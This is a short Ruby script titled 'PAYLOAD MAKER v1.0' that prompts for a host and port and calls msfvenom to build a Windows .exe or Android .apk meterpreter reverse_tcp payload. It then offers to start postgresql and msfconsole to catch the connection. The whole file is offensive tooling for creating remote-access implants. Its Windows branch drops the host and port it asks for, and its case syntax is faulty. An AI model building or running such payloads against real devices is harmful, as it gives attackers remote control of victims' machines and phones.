#
# PAYLOAD MAKER v.1
#
# F0r M0re Inf0 G0 T0
#
# joker64.github.io
# 
#
#

banner = File.read("Banner")
puts banner

# banner in the Banner file

puts "                                               By JOKER64   v1.0        "


puts "1)Windows/metepreter/reverse_tcp "

# PAYLOAD Type 

puts "2)Android/meterpreter/reverse_tcp "


print "Select the Number of PAYLOAD : "

payload = gets.chomp


case payload
when "1"
    print "Set your LHOST = "

     wlhost = gets.chomp

    print "Set your LPORT = "

     wlport = gets.chomp

    print "Location of payload = "

     wlocation = gets.chomp

     puts "[*] Genrating PAYLOAD [*] "

     system("msfvenom -ax86 --platform Windows -p windows/meterpreter/reverse_tcp -e generic/none -f exe > #{wlocation}/PAYLOADMAKER.exe") 

     puts "[*] PAYLOAD Genrated @ #{wlocation} [*] "

     print "Do you Want to Lunch Listener (y/n) "
   
      wlistener = gets.chomp  


else "2"
      print "Set your LHOST = "
 
         alhost = gets.chomp

        print "Set your LPORT = "

        alport = gets.chomp

       print "Loacation of payload = "

       alocation = gets.chomp

      puts "[*] Genrating PAYLOAD [*] "

      system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{alhost} LPORT=#{alport} R > #{alocation}/PAYLOADMAKER.apk")

      puts "[*] PAYLOAD Genrated @ #{alocation} [*] "

        print "Do you Want to Lunch Listener (y/n) "

           alistener = gets.chomp


end

# [*] Lunchin the listener of Windows/meterpreter/reverse_tcp payload [*] :

if wlistener == "y"
  puts "[*] Checking postgresql Service [*] "
  puts "[+] Starting Service postgresql [+] "
  system("service postgresql start")
  puts "[+] Lunching MetaSploit-FrameWork.. [+] "
  system("msfconsole")
elsif wlistener == "n"
   puts "[*]..ShutingDown GoodBye..[*] "
end 


# [*] Lunching the listener of Android/meterpreter/reverse_tcp payload [*] :

if alistener == "y"
  puts "[*] Checking postgresql Service [*] "
  puts "[+] Starting Service postgresql [+] "
  system("service postgresql start")
  puts "[+] Lunching MetaSploit-FrameWork.. [+] "
  system("msfconsole")
elsif alistener == "n"
  puts "[*]..ShutingDown GoodBye..[*] "
end

=begin

Alot of Special things Comming Soon

PAYLOAD-MAKER v1.0

=end


#
#
# Version 1.0 of PAYLOADMAKER
#  
# By JOKER64
#
#
